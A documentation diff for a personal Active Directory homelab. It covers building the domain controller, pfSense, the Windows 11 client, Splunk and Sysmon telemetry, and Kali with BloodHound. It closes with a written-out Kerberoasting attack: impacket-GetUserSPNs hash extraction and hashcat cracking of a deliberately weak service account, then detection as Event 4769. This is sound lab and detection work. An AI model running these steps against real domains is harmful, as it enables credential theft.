@@ -1,62 +1,469 @@
 ---
 title: "Building the Domain Controller — AD DS Installation & Promotion"
 sidebarTitle: "Build"
-description: "Provisioning the Windows Server 2022 VM in VMware Workstation Pro, configuring dual network adapters, and installing Active Directory Domain Services to create the domain."
+description: "Provisioning the Windows Server 2022 domain controller, standing up pfSense as the lab router, and building and joining the Windows 11 client to the domain."
 icon: "screwdriver-wrench"
 ---
 
-This phase takes a bare Windows Server 2022 VM and turns it into a functioning domain controller. Nothing here is complicated on its own, but the order matters — networking gets configured before the AD DS role goes on, because promotion bakes in the machine's name and address.
+This phase takes a bare Windows Server 2022 VM to a functioning domain controller. Networking gets configured before the AD DS role goes on, since promotion registers DNS records against whatever address the machine has at the time.
 
 <Steps>
-  <Step title="Provision the server VM">
-    Create the Windows Server 2022 virtual machine in VMware Workstation Pro 17 and complete the initial out-of-box setup. This machine becomes the domain controller and the default gateway for the isolated network, so give it enough resources to comfortably run four roles at once.
+  <Step title="Set up the host-only network">
+    In VMware Workstation's Virtual Network Editor, confirm (or create) a host-only network — `VMnet1` in this build, subnet `192.168.125.0/24`. Uncheck **"Use local DHCP service to distribute IP addresses to VMs"**, since every machine on this network gets a static IP by hand.
+  </Step>
+  <Step title="Provision the VM">
+    Create the VM: 2 vCPU, 4GB RAM, 60GB disk. Attach two network adapters — one set to **Custom → VMnet1** (host-only), one set to **NAT**. Install **Windows Server 2022 Datacenter Evaluation (Desktop Experience)**.
 
-    <Frame caption="Windows Server 2022 after initial setup">
-      ![Windows Server 2022 desktop after first boot](https://raw.githubusercontent.com/by-tayo/ad-homelab/main/images/windows_home_page.png)
+    <Frame caption="VM Settings — network adapter set to Custom (VMnet1)">
+      ![VMware Workstation VM settings showing the network adapter set to Custom VMnet1](https://raw.githubusercontent.com/by-tayo/ad-homelab/main/images/vm_network_adapter_vmnet1.png)
+    </Frame>
+
+    <Note>
+      Datacenter and Standard editions behave identically for everything in this build (AD DS, DNS, GPOs) — Datacenter's extra features are enterprise/hosting-provider-specific and don't come into play here. Use whichever evaluation ISO you already have.
+    </Note>
+  </Step>
+  <Step title="Configure the static IP">
+    Inside Windows, set the `VMnet1` adapter to a static IP — `192.168.125.10`, subnet mask `255.255.255.0`, no gateway (this adapter is domain-only, not an internet path), DNS pointed at `127.0.0.1` since this machine will run its own AD-integrated DNS once promoted. Leave the NAT adapter on automatic/DHCP.
+
+    <Frame caption="Network Connections on DC01">
+      ![Windows Network Connections showing the Ethernet adapters on DC01](https://raw.githubusercontent.com/by-tayo/ad-homelab/main/images/network_adapters.png)
     </Frame>
   </Step>
-  <Step title="Add the second network adapter">
-    Configure two network adapters on the VM. Attach the first to NAT for internet access, and the second to an internal, isolated network that only the lab machines can reach.
-
-    In VMware Workstation the adapter type is set per-NIC in the VM settings — confirm both are present and connected before booting into the guest, since a missing adapter is easier to fix here than to diagnose later from inside Windows.
+  <Step title="Rename the computer">
+    Rename the machine to `DC01` before installing roles (System Properties → Rename this PC), and reboot. Doing this first avoids any confusion later between the machine name and DNS records.
   </Step>
-  <Step title="Configure the internal adapter">
-    Inside Windows, open the network connections and configure the internal adapter manually with a static IP address, subnet mask, and DNS setting. The NAT adapter can be left on automatic — VMware's NAT service will supply its address.
+  <Step title="Install the AD DS role">
+    From Server Manager → **Add Roles and Features**, install **Active Directory Domain Services**. This only stages the binaries — it does not create a domain yet.
 
-    Naming the adapters at this point (`Internal` and `NAT`, or similar) saves confusion for the rest of the build, since you will be returning to these settings when configuring DHCP and RAS.
-
-    <Frame caption="Both adapters visible in Network Connections — NAT and internal">
-      ![Windows Network Connections showing two network adapters](https://raw.githubusercontent.com/by-tayo/ad-homelab/main/images/network_connections.png)
+    <Frame caption="Add Roles and Features Wizard — Active Directory Domain Services selected">
+      ![Add Roles and Features Wizard with AD DS checked on the Server Roles screen](https://raw.githubusercontent.com/by-tayo/ad-homelab/main/images/ad_ds_role_install.png)
     </Frame>
   </Step>
-  <Step title="Install Active Directory Domain Services">
-    From Server Manager, add the AD DS role. The installation itself only stages the binaries — it does not create a domain.
+  <Step title="Promote to a domain controller">
+    Click the notification flag in Server Manager → **Promote this server to a domain controller** → **Add a new forest**, root domain `corp.lab`. Accept the DNS delegation warning (expected in a lab with no parent zone), set a DSRM password, and let it install and reboot.
 
-    DNS is installed alongside AD DS as a dependency. This is expected: Active Directory relies on DNS to publish the service records that clients use to locate domain controllers.
-
-    <Frame caption="Adding the Active Directory Domain Services role in Server Manager">
-      ![Server Manager Add Roles wizard with AD DS selected](https://raw.githubusercontent.com/by-tayo/ad-homelab/main/images/ad_ds.png)
-    </Frame>
-  </Step>
-  <Step title="Promote the server and create the domain">
-    After the role installs, run the promotion wizard to create a new forest and domain. This is the step that actually brings Active Directory into existence, and the server reboots at the end of it.
-
-    Once it comes back up, check the Local Server properties in Server Manager — the domain now appears in place of the previous workgroup, which is the quickest confirmation that promotion succeeded.
-
-    <Frame caption="Local Server properties showing the domain in place of a workgroup">
-      ![Server Manager Local Server view showing the configured domain](https://raw.githubusercontent.com/by-tayo/ad-homelab/main/images/local_server_domain.png)
+    <Frame caption="AD DS Configuration Wizard — Deployment Configuration screen">
+      ![AD DS Configuration Wizard showing the Add a new forest option with root domain corp.lab](https://raw.githubusercontent.com/by-tayo/ad-homelab/main/images/ad_ds_deployment_config.png)
     </Frame>
   </Step>
 </Steps>
 
-## Verifying the Domain
+## Verifying the Promotion
 
-The Local Server view in Server Manager is the first checkpoint. Before promotion the machine belongs to a workgroup; after promotion the properties list the domain name. If it still reads as a workgroup, promotion did not complete and there is no point continuing to the role configuration.
+After the reboot, log in as the domain Administrator and run two checks from an elevated PowerShell session:
+
+```powershell
+dcdiag
+repadmin /replsummary
+```
+
+`dcdiag` runs a full suite of domain controller health checks. In a fresh single-DC lab, most tests should come back `passed test`.
+
+<Tip>
+  A **`failed test SystemLog`** result is common on a freshly promoted DC and usually not a real problem — that specific test just checks whether the Windows System Event Log has any Error/Warning entries from the last 24 hours, which a machine that just went through install → role add → promotion → reboot almost always has (time-sync warnings, driver init messages). It isn't AD-specific. Check Event Viewer's System log for anything sourced from **NTDS**, **DNS Server**, or **Netlogon** specifically — if none of those appear as Errors, and the rest of `dcdiag` (Advertising, Replications, NetLogons, Services) passed, the DC is functionally healthy.
+</Tip>
+
+## File Transfer for Later Scripts
+
+Bulk provisioning (next phase) needs PowerShell scripts and a CSV copied onto DC01. VMware's **Shared Folders** feature handles this, but it depends on **VMware Tools** being installed inside the guest — without it, `\\vmware-host\Shared Folders\...` won't resolve even if the share is configured correctly on the host side.
+
+Install it via **VM → Install VMware Tools** in the Workstation menu, run `setup64.exe` from the mounted virtual CD inside Windows, and reboot. Then enable a shared folder pointing at a local (non-cloud-synced) folder on the host — OneDrive or similar cloud-sync folders can leave files as unmaterialized placeholders that VMware can't read correctly, so a plain local folder is more reliable.
+
+<Frame caption="The error hit before VMware Tools was installed in the guest">
+  ![Windows Network Error dialog: cannot access the vmware-host Shared Folders path](https://raw.githubusercontent.com/by-tayo/ad-homelab/main/images/shared_folder_network_error.png)
+</Frame>
+
+<Frame caption="Add Shared Folder Wizard, configuring the local LabFiles path">
+  ![VMware Add Shared Folder Wizard with Host path and Name fields](https://raw.githubusercontent.com/by-tayo/ad-homelab/main/images/vmware_shared_folders.png)
+</Frame>
 
 <Warning>
-  Configure the static IP on the internal adapter **before** promoting the server. Promotion registers the domain controller's DNS records against its current address, and changing that address afterwards means cleaning up stale records.
+  Copying `.ps1` files through a network share isn't always lossless — in this build, one script's content got corrupted in transit (the file ended up containing prose instead of code, which PowerShell then failed to parse with a string of confusing syntax errors). Here's what that actually looked like on-screen:
+
+  <Frame caption="The corrupted import-users.ps1 failing to parse — prose text where PowerShell code should be">
+    ![PowerShell parse errors from a corrupted script file](https://raw.githubusercontent.com/by-tayo/ad-homelab/main/images/script_corruption_error.png)
+  </Frame>
+
+  Sanity-check any copied script before running it:
+
+  ```powershell
+  Get-Content .\scriptname.ps1 -TotalCount 5
+  ```
+
+  If that doesn't show recognizable PowerShell (comment headers, `Import-Module`, etc.), the file didn't transfer cleanly — re-copy it, or write it directly on the VM instead (see [Configuration](/projects/ad-homelab/configuration) for how the CSV was generated locally to sidestep this entirely).
 </Warning>
+
+## Standing Up pfSense as the Lab Router
+
+With the DC promoted and users on their way, the network itself got rebuilt around a dedicated router VM rather than continuing with a NAT adapter per machine (see [Architecture](/projects/ad-homelab/architecture) for why).
+
+<Steps>
+  <Step title="Download pfSense CE">
+    Grabbed the Netgate Installer image for pfSense Community Edition — `2.8.1-RELEASE`, the current stable release. The installer also offers a `2.9.0` beta by default; picked the stable option instead.
+  </Step>
+  <Step title="Provision the pfSense VM">
+    New VM with two adapters: one **NAT** (`VMnet8`, WAN) and one **Custom → VMnet1** (host-only, LAN). pfSense doesn't need much — 1 vCPU and 1GB\+ RAM is enough for CE at this scale.
+  </Step>
+  <Step title="Assign interfaces">
+    In the installer's interface-assignment step, matched `em0` to WAN (the NAT adapter) and `em1` to LAN (`VMnet1`), based on the order the adapters were added to the VM.
+  </Step>
+  <Step title="Configure WAN and LAN">
+    WAN stayed on its default — DHCP client, pulling an address from VMware's NAT DHCP. LAN got changed from the installer's default `192.168.1.1/24` to `192.168.125.254/24` (see [Architecture](/projects/ad-homelab/architecture) for why `.254` instead of `.1`), with the DHCP server range set to `192.168.125.100`–`199`.
+  </Step>
+  <Step title="Finish the install">
+    Kept the installer's default ZFS/GPT filesystem options and rebooted into the new pfSense install.
+  </Step>
+  <Step title="Initial GUI setup">
+    Logged into `https://192.168.125.254` (a self-signed cert warning is expected — safe to bypass in a lab), signed in with the default `admin`/`pfsense` credentials, and ran the setup wizard: hostname/domain, DNS servers set to `1.1.1.1` primary / `8.8.8.8` secondary (left "Allow DNS server list to be overridden by DHCP/PPP on WAN" checked), confirmed the WAN/LAN interface assignment, and set a new admin password — the wizard requires changing it off the default.
+  </Step>
+</Steps>
+
+## Rewiring DC01 and CLIENT01 Through pfSense
+
+Once pfSense was routing, both existing VMs needed to drop their old per-VM NAT adapter and point at the new gateway instead:
+
+1. In VM Settings, removed (or disconnected) each machine's `VMnet8` NAT adapter — a single `VMnet1` adapter is now enough.
+2. Re-opened each machine's static IP properties and added the new default gateway, `192.168.125.254`, alongside the existing address:
+   - **DC01** — `192.168.125.10`, DNS `127.0.0.1` (still its own AD-integrated DNS)
+   - **CLIENT01** — `192.168.125.20`, DNS `192.168.125.10` (DC01)
+3. Verified end-to-end connectivity with `ping 192.168.125.254` and `ping 8.8.8.8` from both machines — 0% packet loss confirmed pfSense was routing correctly before moving on.
+
+<Warning>
+  When reopening a VM's static-IP dialog to add the gateway, don't assume only the gateway field is blank — in this build the IP and subnet mask fields came back empty too and needed re-entering in full. Also worth double-checking after any VM reboot: a stale or duplicate IP binding can silently push a machine back to DHCP/APIPA. `Get-NetIPAddress -AddressFamily IPv4` shows every bound address (not just the "preferred" one `ipconfig` reports), and `Remove-NetIPAddress -Confirm:$false` clears a stale entry before re-adding a clean static IP.
+</Warning>
+
+## Building CLIENT01 and Joining the Domain
+
+<Steps>
+  <Step title="Provision the VM">
+    New VM: Custom (advanced) configuration, 2 vCPU, 4GB RAM, 60GB disk, one network adapter set to **Custom → VMnet1**. Guest OS set to Windows 11, which makes VMware auto-add and encrypt a virtual TPM 2.0 — required for Windows 11 setup. **Windows 11 Pro** was used, since Home cannot join a domain.
+
+    <Frame caption="CLIENT01 desktop after Windows 11 Pro setup completes">
+      ![Windows 11 desktop on the freshly provisioned CLIENT01 VM](https://raw.githubusercontent.com/by-tayo/ad-homelab/main/images/windows_11_client.png)
+    </Frame>
+  </Step>
+  <Step title="Local account only, no Microsoft sign-in">
+    To keep CLIENT01 as a clean local-admin baseline — useful later for network/malware forensics work — rather than tying it to a Microsoft account, the OOBE network/sign-in requirement was bypassed: `Shift+F10` during setup for a command prompt, then `start ms-cxh:localonly` to drop straight into a local-account flow. (The registry fallback — `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\OOBE /v BypassNRO /t REG_DWORD /d 1 /f` followed by a reboot — also works if that shortcut changes in a future Windows build.)
+  </Step>
+  <Step title="Static IP">
+    Set the `VMnet1` adapter to `192.168.125.20`, mask `255.255.255.0`, gateway `192.168.125.254` (pfSense), DNS `192.168.125.10` (DC01).
+  </Step>
+  <Step title="Join the domain">
+    `sysdm.cpl` → Computer Name tab → Change → **Domain**, entered `corp.lab`, authenticated as `CORP\Administrator`, and restarted.
+  </Step>
+</Steps>
+
+Confirmed via **System Properties** showing `Domain: corp.lab`, and via **Active Directory Users and Computers** on DC01 showing the new computer object in the default `Computers` container.
+
+<Frame caption="System Properties on CLIENT01 showing Domain: corp.lab after the join">
+  ![CLIENT01 System Properties confirming membership in the corp.lab domain](https://raw.githubusercontent.com/by-tayo/ad-homelab/main/images/verify_domain.png)
+</Frame>
+
+## Building LOGSRV and Installing Splunk
+
+With the domain and client in place, the next phase stood up a dedicated log server (`LOGSRV`) and wired Sysmon \+ the Splunk Universal Forwarder into DC01 and `CLIENT01` so every event flowing off those machines lands in one indexed, searchable place.
+
+<Steps>
+  <Step title="Provision LOGSRV">
+    New VM: 2 vCPU, 4GB RAM, single `Custom → VMnet1` adapter. Installed **Ubuntu Server 26.04 LTS** and set a static IP of `192.168.125.30`, subnet `255.255.255.0`, gateway `192.168.125.254` (pfSense), DNS `192.168.125.10` (DC01) — same pattern as every other lab VM.
+  </Step>
+  <Step title="Install Splunk Enterprise">
+    Downloaded the `.deb` for Splunk Enterprise, installed it, accepted the license on first launch, and set it to auto-start on boot:
+
+    ```bash
+    sudo dpkg -i splunk-*.deb
+    sudo /opt/splunk/bin/splunk start --accept-license
+    sudo /opt/splunk/bin/splunk enable boot-start
+    ```
+
+    Opened the receiving port for forwarders on `9997`:
+
+    ```bash
+    sudo /opt/splunk/bin/splunk enable listen 9997 -auth admin:<password>
+    ```
+
+    Confirmed the web UI came up on `http://192.168.125.30:8000` and logged in successfully.
+
+    <Frame caption="Splunk Enterprise web UI on LOGSRV">
+      ![Splunk Enterprise home screen after login on LOGSRV](https://raw.githubusercontent.com/by-tayo/ad-homelab/main/images/splunk-home.png)
+    </Frame>
+  </Step>
+  <Step title="Deploy Sysmon on DC01 and CLIENT01">
+    Downloaded [Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon) and the [SwiftOnSecurity `sysmon-config`](https://github.com/SwiftOnSecurity/sysmon-config) ruleset onto each machine, then installed from an elevated prompt:
+
+    ```powershell
+    .\Sysmon64.exe -accepteula -i sysmonconfig-export.xml
+    ```
+
+    Verified events were being generated under **Event Viewer → Applications and Services Logs → Microsoft → Windows → Sysmon → Operational** — Event ID `1` (process creation) and Event ID `22` (DNS query) both showing up as expected.
+
+    <Frame caption="Sysmon Operational log in Event Viewer on DC01">
+      ![Event Viewer showing the Sysmon Operational channel with process-creation and DNS-query events](https://raw.githubusercontent.com/by-tayo/ad-homelab/main/images/Eventviewer.png)
+    </Frame>
+  </Step>
+  <Step title="Install the Splunk Universal Forwarder on DC01 and CLIENT01">
+    Installed silently via `msiexec`, pointing `RECEIVING_INDEXER` at LOGSRV on port `9997`:
+
+    ```powershell
+    msiexec /i splunkforwarder-<version>-x64-release.msi ^
+      RECEIVING_INDEXER="192.168.125.30:9997" ^
+      LAUNCHSPLUNK=1 AGREETOLICENSE=Yes /quiet
+    ```
+
+    Added a custom `inputs.conf` stanza on each host to forward the Sysmon Operational channel specifically (not just the default Security/System/Application logs):
+
+    ```ini inputs.conf
+    [WinEventLog://Microsoft-Windows-Sysmon/Operational]
+    disabled = 0
+    renderXml = true
+    index = main
+    ```
+
+    Restarted the `SplunkForwarder` service on each host to pick up the config.
+  </Step>
+  <Step title="Rename CLIENT01 to match the lab's naming">
+    Renamed the client from its Windows-assigned default (`DESKTOP-HNA8DUJ`) to `CLIENT01` so the reporting host name in Splunk matches the rest of the lab:
+
+    ```powershell
+    Rename-Computer -NewName CLIENT01 -DomainCredential CORP\Administrator -Restart
+    ```
+
+    After the reboot, Splunk started reporting new events under `host="CLIENT01"` instead of the old default.
+  </Step>
+  <Step title="Verify the end-to-end pipeline in Splunk">
+    From Splunk's search UI, ran:
+
+    ```spl
+    index=main | stats count by host
+    ```
+
+    Result: DC01 reporting 4,393\+ events, `CLIENT01` reporting 318\+ events (plus a residual chunk under the pre-rename `DESKTOP-HNA8DUJ` from before the rename). Filtering on Sysmon specifically:
+
+    ```spl
+    index=main sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
+    ```
+
+    confirmed 1,962 Sysmon process-creation events from DC01 alone — the full Sysmon → Universal Forwarder → Splunk pipeline is working end to end.
+
+    <Frame caption="Splunk: stats count by host — DC01, CLIENT01, and the pre-rename DESKTOP-HNA8DUJ">
+      ![Splunk search results grouping events by host, showing DC01 and CLIENT01 reporting](https://raw.githubusercontent.com/by-tayo/ad-homelab/main/images/splunk-hosts.png)
+    </Frame>
+
+    <Frame caption="Splunk: Sysmon events indexed from DC01">
+      ![Splunk search results for Sysmon Operational events sourced from DC01](https://raw.githubusercontent.com/by-tayo/ad-homelab/main/images/splunk-events.png)
+    </Frame>
+  </Step>
+</Steps>
+
+<Warning>
+  Splunk will silently stop indexing and searching when its disk fills up, and the default Ubuntu Server install can leave you closer to that line than you'd expect. On this build, the installer only allocated ~19GB to the LVM root volume and left the rest of the 40GB disk unassigned — Splunk quietly hit the wall and stopped returning search results with no obvious error in the UI.
+
+  Check free space first (`df -h /`) and, if the root LV is small, extend it into the free space in the volume group:
+
+  ```bash
+  sudo lvextend -l +100%FREE /dev/mapper/ubuntu--vg-ubuntu--lv
+  sudo resize2fs /dev/mapper/ubuntu--vg-ubuntu--lv
+  ```
+
+  Same tone of "silent misbehavior with a boring root cause" as the earlier pfSense stale-IP issue — worth doing up front on any Ubuntu VM that's going to hold indexed log data.
+</Warning>
+
+<Tip>
+  On `CLIENT01` the Universal Forwarder installer didn't drop an `outputs.conf` under `C:\Program Files\SplunkUniversalForwarder\etc\system\local\` on the first try, so the forwarder was running with no receiver configured and nothing was showing up in Splunk. Creating it manually with the same `RECEIVING_INDEXER` value fixed it:
+
+  ```ini outputs.conf
+  [tcpout]
+  defaultGroup = default-autolb-group
+  
+  [tcpout:default-autolb-group]
+  server = 192.168.125.30:9997
+  
+  [tcpout-server://192.168.125.30:9997]
+  ```
+</Tip>
+
+## Standing Up Kali and BloodHound CE
+
+With the domain, client, GPOs, and telemetry pipeline all in place, the next phase brings in the attacker side of the lab. An existing Kali VM was wired into `VMnet1` alongside the rest of the lab, and BloodHound Community Edition was installed on it to enumerate the domain remotely and map out attack paths.
+
+<Steps>
+  <Step title="Wire the Kali VM into the lab network">
+    Existing Kali VM already provisioned — reconfigured its single network adapter to **Custom → VMnet1** so it sits on the same host-only network as DC01, `CLIENT01`, and LOGSRV. Left it on DHCP; pfSense handed out `192.168.125.101` from the reserved DHCP scope.
+
+    Verified basic connectivity from Kali:
+
+    ```bash
+    ping -c 3 192.168.125.254   # pfSense gateway
+    ping -c 3 8.8.8.8            # internet through pfSense NAT
+    nslookup corp.lab 192.168.125.10   # DNS resolution through DC01
+    ```
+
+    All three came back clean — pfSense is routing Kali's traffic, and DC01 is answering domain DNS queries.
+  </Step>
+  <Step title="Install BloodHound Community Edition via Docker">
+    BloodHound CE ships as a Docker Compose stack, which keeps the app, Postgres app database, and Neo4j graph database bundled together with matching versions rather than installed individually on Kali.
+
+    ```bash
+    sudo apt update
+    sudo apt install -y docker.io docker-compose
+    sudo systemctl enable --now docker
+    
+    curl -L https://ghst.ly/getbhce -o docker-compose.yml
+    sudo docker-compose up -d
+    ```
+
+    Three containers come up: `app-db` (Postgres), `graph-db` (Neo4j), and the BloodHound app itself. Confirmed the web UI at `http://localhost:8080` and logged in.
+
+    <Frame caption="BloodHound Community Edition Explore page after login">
+      ![BloodHound CE web UI showing the Explore page](https://raw.githubusercontent.com/by-tayo/ad-homelab/main/images/bloodhound%20ui.png)
+    </Frame>
+  </Step>
+  <Step title="Enumerate the domain with bloodhound-ce-python">
+    Ran the Python-based BloodHound CE collector remotely over LDAP — no foothold on a domain machine required, just valid low-privilege credentials for `jsmith` (one of the 1,050 users bulk-provisioned earlier):
+
+    ```bash
+    bloodhound-ce-python \
+      -d corp.lab \
+      -dc DC01.corp.lab \
+      -ns 192.168.125.10 \
+      -u jsmith \
+      -p '<password>' \
+      -c All \
+      --zip
+    ```
+
+    Result: **1,030 users, 61 groups, 5 GPOs, 34 OUs, 19 containers, 2 computers** (DC01 \+ `CLIENT01`), 0 trusts, written into a single `.zip` for upload.
+  </Step>
+  <Step title="Upload into BloodHound">
+    In the BloodHound web UI → **Administration → Quick Upload**, dropped the collector's `.zip`. Every data file (computers, users, containers, domains, GPOs, groups) processed successfully and the graph populated on the Explore page.
+
+    <Frame caption="Uploading the collector .zip into BloodHound's Quick Upload">
+      ![BloodHound Quick Upload dialog with the collector zip attached](https://raw.githubusercontent.com/by-tayo/ad-homelab/main/images/connecttozip.png)
+    </Frame>
+
+    <Frame caption="BloodHound analyzing the uploaded zip — all data files processed">
+      ![BloodHound processing the uploaded computers, users, containers, domains, GPOs, and groups files](https://raw.githubusercontent.com/by-tayo/ad-homelab/main/images/analyzing%20zip.png)
+    </Frame>
+  </Step>
+  <Step title="Run a first attack-path check">
+    Two initial checks from BloodHound's Cypher query pane:
+
+    ```cypher
+    // Any privilege-escalation path from jsmith to Domain Admins?
+    MATCH p = shortestPath((u:User {name:"JSMITH@CORP.LAB"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LAB"}))
+    RETURN p
+    ```
+
+    Result: **no path found** — a legitimate and expected finding at this stage, since no ACL misconfigurations have been deliberately introduced yet.
+
+    ```cypher
+    // Any Kerberoastable accounts (service accounts with an SPN set)?
+    MATCH (u:User {hasspn:true}) RETURN u.name
+    ```
+
+    Result: **none** — every domain user in the lab is a plain account with no Service Principal Name registered.
+
+    <Frame caption="BloodHound graph view of the enumerated corp.lab directory">
+      ![BloodHound showing nodes and connections across corp.lab after the initial pathfinding query](https://raw.githubusercontent.com/by-tayo/ad-homelab/main/images/connections%20bd.png)
+    </Frame>
+  </Step>
+</Steps>
+
+<Note>
+  Getting "no path" and "no Kerberoastable accounts" back on a freshly provisioned directory is the correct baseline, not a broken setup — it's what a well-configured, plain-vanilla AD environment should look like from an attacker's perspective. The next section introduces one realistic misconfiguration on purpose (`svc_sql` with an SPN and a weak password), then runs the full Kerberoasting attack against it and verifies the ticket request lands in Splunk on DC01.
+</Note>
+
+## Attack Simulation: Kerberoasting
+
+With the clean-baseline check out of the way, this phase deliberately introduces a common real-world misconfiguration — a service account with a Service Principal Name registered and a weak, dictionary-crackable password — then runs a full Kerberoasting attack against it from Kali using only low-privilege domain credentials, cracks the recovered hash offline with `hashcat`, and verifies the whole thing lands in Splunk as a Windows Security Event ID `4769` on DC01. It closes the loop between the offensive tooling stood up in the previous section and the Sysmon \+ Splunk pipeline built out before that.
+
+<Steps>
+  <Step title="Create the deliberately vulnerable service account">
+    On DC01, provisioned a new service account (`svc_sql`) inside the `IT` OU with a weak, dictionary-style password and registered a Service Principal Name against it:
+
+    ```powershell
+    New-ADUser `
+      -Name "svc_sql" `
+      -SamAccountName "svc_sql" `
+      -UserPrincipalName "svc_sql@corp.lab" `
+      -Path "OU=Users,OU=IT,OU=Corp,DC=corp,DC=lab" `
+      -AccountPassword (ConvertTo-SecureString "Summer2024!" -AsPlainText -Force) `
+      -Enabled $true `
+      -PasswordNeverExpires $true
+    
+    setspn -S MSSQLSvc/dc01.corp.lab:1433 corp.lab\svc_sql
+    ```
+
+    Mirrors the classic real-world pattern: a service account created once for an app (SQL Server, here), a weak password chosen so the DBA can remember it, an SPN registered so Kerberos can hand out tickets for it, and then no one touches it again for years.
+  </Step>
+  <Step title="Run the Kerberoasting attack from Kali">
+    On the Kali VM, installed Impacket and used `impacket-GetUserSPNs` to request a Kerberos service ticket for `svc_sql` with only `jsmith`'s low-privilege domain credentials — no admin rights, no foothold on a domain-joined machine, just a valid user in `corp.lab`:
+
+    ```bash
+    sudo apt install -y impacket-scripts
+    
+    impacket-GetUserSPNs corp.lab/jsmith \
+      -dc-ip 192.168.125.10 \
+      -request \
+      -outputfile svc_sql.hash
+    ```
+
+    The tool authenticated to DC01, enumerated accounts with an SPN, requested a TGS for `svc_sql`, and wrote the crackable TGS-REP hash out in the format `hashcat` mode `13100` expects.
+
+    <Frame caption="impacket-GetUserSPNs returning the Kerberos TGS-REP hash for svc_sql">
+      ![impacket-GetUserSPNs output showing the svc\_sql SPN and extracted Kerberos hash](https://raw.githubusercontent.com/by-tayo/ad-homelab/main/images/impacket.png)
+    </Frame>
+
+    <Frame caption="TGS-REP hash written to svc_sql.hash, ready for hashcat">
+      ![Impacket run showing the hash file being written for offline cracking](https://raw.githubusercontent.com/by-tayo/ad-homelab/main/images/impacket2.png)
+    </Frame>
+  </Step>
+  <Step title="Crack the hash offline with hashcat">
+    First attempt used Kali's built-in `rockyou.txt` wordlist — a real password-breach corpus from 2009 — and, as expected for a newer-style password, no hits:
+
+    ```bash
+    hashcat -m 13100 svc_sql.hash /usr/share/wordlists/rockyou.txt
+    ```
+
+    Built a small custom wordlist covering common season/year patterns (`Summer2024!`, `Winter2024!`, etc.), re-ran `hashcat`, and recovered the plaintext:
+
+    ```bash
+    hashcat -m 13100 svc_sql.hash custom.txt --force
+    # Status.....: Cracked
+    # $krb5tgs$23$*svc_sql$CORP.LAB$MSSQLSvc/dc01.corp.lab~1433*...:Summer2024!
+    ```
+
+    <Frame caption="hashcat cracking the svc_sql TGS-REP hash and recovering Summer2024!">
+      ![hashcat output showing the cracked svc\_sql password Summer2024!](https://raw.githubusercontent.com/by-tayo/ad-homelab/main/images/hashcat.png)
+    </Frame>
+
+    The two-wordlist arc is worth calling out on purpose: `rockyou` is a real breach corpus, not a toy wordlist, and it still misses this password — which is exactly how offline cracking actually goes. Attackers don't run one list and quit; they iterate with targeted wordlists and rules until something hits.
+  </Step>
+  <Step title="Verify the attack in Splunk on DC01">
+    Back on LOGSRV, searched Splunk for the ticket-request event the attack should have generated:
+
+    ```spl
+    index=main host=DC01 EventCode=4769 Service_Name=svc_sql
+    ```
+
+    A single Windows Security Event ID `4769` came back with all three forensic details lined up:
+
+    - **`Account_Name`** — `jsmith@CORP.LAB` (the account whose credentials Kali used, i.e. the attacker's foothold)
+    - **`Client_Address`** — the Kali VM's DHCP address, `192.168.125.101`
+    - **`Ticket_Encryption_Type`** — `0x17` (RC4), a well-known Kerberoasting indicator because modern AD normally negotiates AES for service tickets, and legitimate services rarely fall back to RC4
+
+    <Frame caption="Splunk Event ID 4769 on DC01 — svc_sql service ticket, jsmith requester, Kali source IP, RC4 encryption">
+      ![Splunk event detail for the 4769 Kerberos service ticket request tied to svc\_sql](https://raw.githubusercontent.com/by-tayo/ad-homelab/main/images/splunk-events.png)
+    </Frame>
+
+    No new instrumentation was added for this — the same Sysmon \+ Splunk Universal Forwarder pipeline built in the earlier telemetry phase caught the attack the moment it happened.
+  </Step>
+</Steps>
+
+<Tip>
+  **Key takeaway.** Service accounts are one of the most durable weak points in Active Directory. Any authenticated domain user can request a Kerberos ticket for any SPN-registered account, so the account's password strength is the entire defense — offline cracking is unlimited by lockout policy. In production, that means service account passwords need to be long (25\+ characters), random, and rotated — the opposite of the deliberately weak `Summer2024!` used here. Group Managed Service Accounts (gMSAs) solve this at the platform level by handling rotation automatically.
+</Tip>
 
 ## What Comes Next
 
-At this point the domain exists but nothing uses it. The client cannot lease an address, cannot reach the internet, and there are no accounts beyond the built-in administrator. Those are handled in [Roles & User Provisioning](/projects/ad-homelab/configuration).
+The domain, network, client, GPOs, telemetry pipeline, attacker VM, and a full offensive-plus-detection scenario are all in place: a Kerberoasting attack was executed end to end against `svc_sql` and caught by the existing Splunk pipeline as Event ID `4769` on DC01. The bulk-provisioning phase that populated the directory with 1,050 users is covered separately in [OU Structure & Bulk Provisioning](/projects/ad-homelab/configuration); the current lab status and remaining loose ends are tracked on [Status & Next Steps](/projects/ad-homelab/validation).
